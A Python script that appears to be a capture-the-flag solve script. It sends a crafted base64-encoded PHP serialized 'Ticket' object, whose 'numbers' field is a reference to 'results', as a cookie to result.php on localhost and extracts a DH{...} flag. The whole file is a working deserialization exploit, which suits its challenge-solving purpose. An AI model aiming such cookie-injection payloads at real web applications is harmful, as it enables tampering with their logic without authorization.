import re
import sys
import base64
import urllib.request

class Exploit:
    def __init__(self, baseURL, endPoint):
        self.baseURL = baseURL.rstrip("/")
        self.endPoint = endPoint

    def serizalition_payload(self):
        serizalition = 'O:6:"Ticket":2:{s:7:"results";a:0:{}s:7:"numbers";R:2;}'
        return base64.b64encode(serizalition.encode()).decode()

    def http_get(self, url, cookie_value, timeout=10):
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Cookie", f"ticket={cookie_value}")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
        return resp.getcode(), body
    
    def extract_flag(self, text):
        flag = re.search(r"(DH\{[^\r\n}]*\})", text)
        if flag:
            return flag.group(1)
        else:
            return None
    
    def run(self):
        url = f"{self.baseURL}/{self.endPoint}"
        cookie_base64 = self.serizalition_payload()
        print(f"[+] Target: {url}")
        print(f"[+] Cookie Ticket Base64: {cookie_base64}")
        try:
            code, body = self.http_get(url, cookie_base64)
        except Exception as e:
            print(f"[-] Request failed: {e}")
            sys.exit(2)
        
        print(f"[+] HTTP Get: {code}")
        flag_here = self.extract_flag(body)
        if flag_here:
            print(f"[+] Done Flag Here: \n", flag_here)
            return True
        else:
            print(f"[-] Failed Extract Flag: \n")
            return False

if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:80"
    ENDPONT = "result.php"
    exploit = Exploit(BASE_URL, ENDPONT)
    exploit.run()

